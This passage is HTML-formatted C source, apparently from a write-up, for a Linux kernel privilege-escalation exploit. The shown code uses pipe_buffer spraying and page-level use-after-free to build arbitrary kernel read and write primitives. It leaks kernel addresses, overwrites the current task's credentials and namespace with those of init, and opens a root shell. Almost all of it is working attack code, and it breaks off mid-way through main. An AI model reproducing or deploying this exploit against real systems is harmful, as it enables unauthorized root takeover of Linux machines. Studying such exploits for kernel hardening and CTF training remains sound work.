class="hljs-number">0x100</span>];<br>    info_log(<span class="hljs-string">&quot;Step III:Constrcut the second page level uaf...&quot;</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SECOND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">3</span>*<span class="hljs-number">8</span> - <span class="hljs-number">3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free the original pipe...&quot;</span>);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Spraying the smaller pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_qidx || i == victim_pid || i == orig_pid)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, second_pipe_sz) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;realloc the pipe_buffer failed!&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">memset</span>(pipe_buf, <span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-keyword">sizeof</span>(pipe_buf));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SECOND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-number">4</span>);<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], pipe_buf, <span class="hljs-number">0x28</span>);<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x28</span>/<span class="hljs-number">8</span>; i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[--- data dump ---][%d] %lx\n&quot;</span>, i, pipe_buf[i]);<br>    &#125;<br>    <span class="hljs-built_in">memcpy</span>(&amp;info_pipe_buffer, pipe_buf, <span class="hljs-number">0x28</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]info_pipe_buffer-&gt;page    :%p\033[0m\n&quot;</span>, info_pipe_buffer.page);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]info_pipe_buffer-&gt;offset  :%d\033[0m\n&quot;</span>, info_pipe_buffer.offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]info_pipe_buffer-&gt;len     :%d\033[0m\n&quot;</span>, info_pipe_buffer.len);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]info_pipe_buffer-&gt;ops     :%p\033[0m\n&quot;</span>, info_pipe_buffer.ops);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]info_pipe_buffer-&gt;flags   :%d\033[0m\n&quot;</span>, info_pipe_buffer.flags);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]info_pipe_buffer-&gt;private :%ld\033[0m\n&quot;</span>, info_pipe_buffer.private);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">35</span>; i++)&#123;<br>        write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buffer, <span class="hljs-number">0x28</span>);<br>        write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SECOND_PIPE_BUF_SZ - <span class="hljs-number">0x28</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-type">int</span> nr;<br>        <span class="hljs-type">char</span> tmp[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-keyword">if</span>(i == victim_qidx || i == victim_pid || i == orig_pid)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        <span class="hljs-keyword">if</span>(nr &lt; PIPE_SPRAY_NR &amp;&amp; nr != i)&#123;<br>            orig_second_pid = i;<br>            victim_second_pid = nr;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(victim_second_pid == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Can not find the second victim pid&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]We found the 2nd victim_pid:%d, 2nd original_pid:%d\033[0m\n&quot;</span>, victim_second_pid, orig_second_pid);<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_pipe_buffer</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> THIRD_PIPE_BUF_SZ 192</span><br><span class="hljs-type">int</span> self_2nd_pid = <span class="hljs-number">-1</span>, self_3rd_pid = <span class="hljs-number">-1</span>, self_4th_pid = <span class="hljs-number">-1</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build_self_writing_pipe</span><span class="hljs-params">()</span>&#123;<br>    info_log(<span class="hljs-string">&quot;Step IV:Building the self menufication pipe...&quot;</span>);<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> * <span class="hljs-title">tmp_page</span>;</span><br>    <span class="hljs-type">int</span> third_pipe_sz = <span class="hljs-number">0x1000</span>*(THIRD_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    <br>    write(pipe_fd[victim_second_pid][<span class="hljs-number">1</span>], buf, THIRD_PIPE_BUF_SZ - <span class="hljs-number">3</span>*<span class="hljs-number">8</span> - <span class="hljs-number">3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free the original second pipe...&quot;</span>);<br>    close(pipe_fd[orig_second_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[orig_second_pid][<span class="hljs-number">1</span>]);<br>    <br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Spraying the smaller pipe_buffer...&quot;</span>);<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_qidx || i == victim_pid || i == orig_pid<br>           || i == victim_second_pid || i == orig_second_pid)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, third_pipe_sz) &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Realloc the 192 pipe_buffers failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_pipe_buffer, &amp;info_pipe_buffer, <span class="hljs-number">0x28</span>);<br>    evil_pipe_buffer.offset = THIRD_PIPE_BUF_SZ;<br>    evil_pipe_buffer.len = THIRD_PIPE_BUF_SZ;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Construct the 2nd self read/write pipe...&quot;</span>);<br>    write(pipe_fd[victim_second_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buffer, <span class="hljs-number">0x28</span>);<br>    write(pipe_fd[victim_second_pid][<span class="hljs-number">1</span>], buf, THIRD_PIPE_BUF_SZ - <span class="hljs-number">0x28</span>);<br>    <br>     <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_qidx || i == victim_pid || i == orig_pid<br>           || i == victim_second_pid || i == orig_second_pid)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;tmp_page, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>));<br>        <span class="hljs-keyword">if</span>(tmp_page == evil_pipe_buffer.page)&#123;<br>            self_2nd_pid = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(self_2nd_pid == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Find the 2nd self pipe failed!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Construct the 3rd self read/write pipe...&quot;</span>);<br>    write(pipe_fd[victim_second_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buffer, <span class="hljs-number">0x28</span>);<br>    write(pipe_fd[victim_second_pid][<span class="hljs-number">1</span>], buf, THIRD_PIPE_BUF_SZ - <span class="hljs-number">0x28</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_qidx <br>           || i == victim_pid || i == orig_pid<br>           || i == victim_second_pid || i == orig_second_pid<br>           || i == self_2nd_pid)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;tmp_page, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>));<br>        <span class="hljs-keyword">if</span>(tmp_page == evil_pipe_buffer.page)&#123;<br>            self_3rd_pid = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(self_3rd_pid == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Find the 3rd self pipe failed!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Construct the 4th self read/write pipe...&quot;</span>);<br>    write(pipe_fd[victim_second_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buffer, <span class="hljs-number">0x28</span>);<br>    write(pipe_fd[victim_second_pid][<span class="hljs-number">1</span>], buf, THIRD_PIPE_BUF_SZ - <span class="hljs-number">0x28</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_qidx <br>           || i == victim_pid || i == orig_pid<br>           || i == victim_second_pid || i == orig_second_pid<br>           || i == self_2nd_pid<br>           || i == self_3rd_pid)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;tmp_page, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>));<br>        <span class="hljs-keyword">if</span>(tmp_page == evil_pipe_buffer.page)&#123;<br>            self_4th_pid = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(self_4th_pid == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Find the 4th self pipe failed!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_2nd_pipe</span>;</span>       <span class="hljs-comment">/* pipe_buffer page offset 192 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_3rd_pipe</span>;</span>       <span class="hljs-comment">/* pipe_buffer page offset 192*2 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_4th_pipe</span>;</span>       <span class="hljs-comment">/* pipe_buffer page offset 192*3 */</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup_evil_pipe</span><span class="hljs-params">()</span>&#123;<br>     <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]initial the three pipe_buffer...&quot;</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_2nd_pipe, &amp;info_pipe_buffer, <span class="hljs-number">0x28</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_3rd_pipe, &amp;info_pipe_buffer, <span class="hljs-number">0x28</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_4th_pipe, &amp;info_pipe_buffer, <span class="hljs-number">0x28</span>);<br><br>    evil_2nd_pipe.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_pipe.len = <span class="hljs-number">0xff0</span>;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Hijack the pipe_3nd_buf point to the 4th location...&quot;</span>);<br>    evil_3rd_pipe.offset = <span class="hljs-number">3</span>*THIRD_PIPE_BUF_SZ;<br>    evil_3rd_pipe.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* make 3rd pipe_buffer point to the 4th_pipe_buffer */</span><br>    write(pipe_fd[self_4th_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_pipe, <span class="hljs-keyword">sizeof</span>(evil_4th_pipe));     <br>    <br>    evil_4th_pipe.offset = THIRD_PIPE_BUF_SZ;<br>    evil_4th_pipe.len = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">char</span> tmp_zero_buf[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-string">&#x27;\x00&#x27;</span>&#125;;<br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page* page_to_read, <span class="hljs-type">void</span>* dst)</span>&#123;<br>    <span class="hljs-comment">/* construct the self_2nd_pipe for reading the page_to_read */</span><br>    evil_2nd_pipe.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_pipe.len = <span class="hljs-number">0xfff</span>;<br>    evil_2nd_pipe.page = page_to_read;<br>    <br>    <span class="hljs-comment">/* let the 4th pipe_buffer point to the 2nd buffer */</span><br>    write(pipe_fd[self_3rd_pid][<span class="hljs-number">1</span>], &amp;evil_4th_pipe, <span class="hljs-keyword">sizeof</span>(evil_3rd_pipe));     <br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read */</span><br>    write(pipe_fd[self_4th_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_pipe, <span class="hljs-keyword">sizeof</span>(evil_4th_pipe));<br>    write(pipe_fd[self_4th_pid][<span class="hljs-number">1</span>], tmp_zero_buf, THIRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_4th_pipe));   <span class="hljs-comment">/* 4th point to the 3rd */</span><br><br>    <span class="hljs-comment">/* recover the initial context */</span><br>    write(pipe_fd[self_4th_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_pipe, <span class="hljs-keyword">sizeof</span>(evil_4th_pipe)); <br><br>    read(pipe_fd[self_2nd_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xff8</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page* page_to_write, <span class="hljs-type">void</span>* rsc, <span class="hljs-type">size_t</span> len)</span>&#123;<br>    <span class="hljs-comment">/* construct the self_2nd_pipe for writing the page_to_write */</span><br>    evil_2nd_pipe.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_pipe.len = <span class="hljs-number">0</span>;<br>    evil_2nd_pipe.page = page_to_write;<br>    <span class="hljs-comment">/* let the 4th pipe_buffer point tot the 2nd buffer */</span><br>    write(pipe_fd[self_3rd_pid][<span class="hljs-number">1</span>], &amp;evil_4th_pipe, <span class="hljs-keyword">sizeof</span>(evil_4th_pipe));<br>    <br>    <span class="hljs-comment">/* hijack the 2nd pipe for aarbitrary write */</span><br>    write(pipe_fd[self_4th_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_pipe, <span class="hljs-keyword">sizeof</span>(evil_2nd_pipe));<br>    write(pipe_fd[self_4th_pid][<span class="hljs-number">1</span>], tmp_zero_buf, THIRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_pipe));<br><br>    <span class="hljs-comment">/* recover the initiaal context */</span><br>    write(pipe_fd[self_4th_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_pipe, <span class="hljs-keyword">sizeof</span>(evil_3rd_pipe));<br><br>    write(pipe_fd[self_2nd_pid][<span class="hljs-number">1</span>], rsc, len);<br><br>&#125;<br><br><span class="hljs-type">size_t</span> parent_task, current_task;<br><span class="hljs-type">size_t</span> vmemmap_base, kernel_base, kernel_offset, page_offset_base;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_leaking_by_arbitrary_pipe</span><span class="hljs-params">()</span>&#123;<br>    info_log(<span class="hljs-string">&quot;Step V:Leaking the kernel base addr by arbitrary read...&quot;</span>);<br>    <span class="hljs-type">size_t</span> page_buf[<span class="hljs-number">0x2000</span>];<br>    setup_evil_pipe();<br>    <span class="hljs-type">size_t</span> *comm_addr;<br>    <span class="hljs-type">size_t</span> ptraced;<br>    <span class="hljs-type">int</span> try_hits = <span class="hljs-number">0</span>;<br><br>    vmemmap_base = (<span class="hljs-type">size_t</span>)(info_pipe_buffer.page)&amp;<span class="hljs-number">0xfffffffff0000000</span>;<br>    <span class="hljs-keyword">for</span>(;;)&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Checking for the vmemmap_base&#x27;s reality...&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]possible vmemmap_base:%p\033[0m\n&quot;</span>, (<span class="hljs-type">void</span>*)vmemmap_base);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * We need to know physmap + 0x9d000 fun ptr</span><br><span class="hljs-comment">         * so we should check vmemmap_base + (0x9d000/0x1000)*0x40</span><br><span class="hljs-comment">         * */</span><br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*)(vmemmap_base + <span class="hljs-number">157</span>*<span class="hljs-number">0x40</span>), page_buf);<br>        <span class="hljs-keyword">if</span>(page_buf[<span class="hljs-number">0</span>] == <span class="hljs-number">0x2400000000</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;reading failed!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(page_buf[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0xffffffff81000000</span> &amp;&amp; (page_buf[<span class="hljs-number">0</span>]&amp;<span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x030</span>)&#123;<br>            kernel_base = page_buf[<span class="hljs-number">0</span>] - <span class="hljs-number">0x30</span>;<br>            kernel_offset = kernel_base -  <span class="hljs-number">0xffffffff81000000</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]kernel_base    :%p\033[0m\n&quot;</span>, (<span class="hljs-type">void</span>*)kernel_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]kernel_offset  :%p\033[0m\n&quot;</span>, (<span class="hljs-type">void</span>*)kernel_offset);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        try_hits++;<br>        <span class="hljs-keyword">if</span>(try_hits == <span class="hljs-number">5</span>)&#123;<br>            vmemmap_base -= <span class="hljs-number">0x10000000</span>;<br>            try_hits = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[*]vmemmap_base   :%p\033[0m\n&quot;</span>, (<span class="hljs-type">void</span>*)vmemmap_base);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Leak the page_offset_base...&quot;</span>);<br><br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; <span class="hljs-number">1</span> ;i++)&#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*)(vmemmap_base + (i<span class="hljs-number">-1</span>)*<span class="hljs-number">0x40</span>), page_buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*)(vmemmap_base + i*<span class="hljs-number">0x40</span>), &amp;((<span class="hljs-type">char</span>*)page_buf)[<span class="hljs-number">0x1000</span>]);<br>        <span class="hljs-comment">/* find the struct task_struct.comm */</span><br>        comm_addr = (<span class="hljs-type">size_t</span>*)memmem(page_buf, <span class="hljs-number">0x1ff0</span>,<span class="hljs-string">&quot;PEIWITHHAO&quot;</span>, <span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span>(comm_addr == <span class="hljs-literal">NULL</span>)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>((((<span class="hljs-type">size_t</span>)comm_addr - (<span class="hljs-type">size_t</span>)page_buf)&amp;<span class="hljs-number">0xfff</span>) &lt; <span class="hljs-number">500</span>)&#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">//printf(&quot;[*]comm_addr[-2]:%lx\n&quot;, comm_addr[-2]);</span><br>        <span class="hljs-comment">//printf(&quot;[*]comm_aadr[-3]:%lx\n&quot;, comm_addr[-3]);   </span><br>        <span class="hljs-comment">//printf(&quot;[*]comm_aadr[-52]:%lx\n&quot;, comm_addr[-3]);</span><br>        <span class="hljs-comment">//printf(&quot;[*]comm_aadr[-53]:%lx\n&quot;, comm_addr[-3]);    </span><br>        <span class="hljs-keyword">if</span>(comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>       <span class="hljs-comment">/* task.cred        */</span><br>           &amp;comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>      <span class="hljs-comment">/* task.real_cred   */</span> <br>           &amp;comm_addr[<span class="hljs-number">-52</span>] &gt; <span class="hljs-number">0xffff888000000000</span>     <span class="hljs-comment">/* task.parent      */</span><br>           &amp;comm_addr[<span class="hljs-number">-53</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)&#123;   <span class="hljs-comment">/* task.real_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-53</span>];<br>            ptraced = comm_addr[<span class="hljs-number">-46</span>];               <span class="hljs-comment">/* task.ptraced     */</span><br>            current_task = (comm_addr[<span class="hljs-number">-46</span>] - <span class="hljs-number">2280</span>);        <span class="hljs-comment">/* current_task */</span><br>            page_offset_base = (<span class="hljs-type">size_t</span>)current_task - i*<span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br>            PRINT_ADDR(<span class="hljs-string">&quot;current_task&quot;</span>, current_task);<br>            PRINT_ADDR(<span class="hljs-string">&quot;parent_task&quot;</span>, parent_task);<br>            PRINT_ADDR(<span class="hljs-string">&quot;page_offset_base&quot;</span>, page_offset_base);<br><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_mapping_addr2page</span><span class="hljs-params">(<span class="hljs-type">size_t</span> addr)</span>&#123;<br>    <span class="hljs-type">size_t</span> page_nr = ((addr&amp;(~<span class="hljs-number">0xfff</span>)) - page_offset_base)/<span class="hljs-number">0x1000</span>;<br>    <span class="hljs-keyword">return</span> (vmemmap_base + page_nr*<span class="hljs-number">0x40</span>);<br>&#125;<br><br><br><span class="hljs-type">size_t</span> page_buf[<span class="hljs-number">0x8000</span>];<br><span class="hljs-type">size_t</span> init_task, init_cred, init_nsproxy;<br><span class="hljs-type">void</span> <span class="hljs-title function_">priviledge_escalation</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">size_t</span> *task_buf;<br>    <span class="hljs-type">size_t</span> parent_page;<br>    info_log(<span class="hljs-string">&quot;Step VI:Hijack the current_task to get the root...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(;;)&#123;<br>        parent_page = direct_mapping_addr2page(parent_task);<br>        task_buf = (<span class="hljs-type">size_t</span>*)((<span class="hljs-type">size_t</span>)page_buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*)parent_page, page_buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*)(parent_page + <span class="hljs-number">0x40</span>), &amp;page_buf[<span class="hljs-number">0x1000</span>/<span class="hljs-number">8</span>]);<br>        <br>        <span class="hljs-comment">/* task_struct.real_parent offset is 2224 */</span><br>        <span class="hljs-keyword">if</span>(parent_task == task_buf[<span class="hljs-number">2224</span>/<span class="hljs-number">8</span>])&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        parent_task = task_buf[<span class="hljs-number">2224</span>/<span class="hljs-number">8</span>];<br>    &#125;<br>    init_task = parent_task;<br>    <span class="hljs-comment">/* task_struct.cred offset is 2632 */</span><br>    init_cred = task_buf[<span class="hljs-number">2632</span>/<span class="hljs-number">8</span>];<br>    init_nsproxy = task_buf[<span class="hljs-number">341</span>];<br>    PRINT_ADDR(<span class="hljs-string">&quot;[*]init_task&quot;</span>, (<span class="hljs-type">size_t</span>)init_task);<br>    PRINT_ADDR(<span class="hljs-string">&quot;[*]init_cred&quot;</span>, (<span class="hljs-type">size_t</span>)init_cred);<br>    PRINT_ADDR(<span class="hljs-string">&quot;[*]init_nsproxy&quot;</span>, (<span class="hljs-type">size_t</span>)init_nsproxy);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Escalating root priviledge now!&quot;</span>);<br>    <span class="hljs-type">size_t</span> current_page;<br>    current_page = direct_mapping_addr2page(current_task);<br>    <br>    <span class="hljs-built_in">memset</span>(page_buf, <span class="hljs-string">&#x27;\x00&#x27;</span>, <span class="hljs-keyword">sizeof</span>(page_buf));<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*)current_page, page_buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*)(current_page + <span class="hljs-number">0x40</span>), &amp;page_buf[<span class="hljs-number">0x1000</span>/<span class="hljs-number">8</span>]);<br>    <br>    task_buf = (<span class="hljs-type">size_t</span>*)((<span class="hljs-type">size_t</span>)page_buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    task_buf[<span class="hljs-number">2632</span>/<span class="hljs-number">8</span>] = init_cred;<br>    task_buf[<span class="hljs-number">2624</span>/<span class="hljs-number">8</span>] = init_cred;<br>    task_buf[<span class="hljs-number">341</span>] = init_nsproxy;<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*)current_page, page_buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*)(current_page + <span class="hljs-number">0x40</span>), &amp;page_buf[<span class="hljs-number">0x1000</span>/<span class="hljs-number">8</span>], <span class="hljs-number">0xff0</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Done!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><br><span class="hljs-type">int</span> msg_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    pipe(msg_pipe);<br>    bind_cpu(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span>(!fork())&#123;<br>        unshare(CLONE_NEWNS | CLONE_NEWUSER);<br>        occupy_4k_obj_by_msg();sleep(<span class="hljs-number">1</span>);<br>        construct_first_uaf();sleep(<span class="hljs-number">1</span>);<br>        construct_second_uaf();sleep(<span 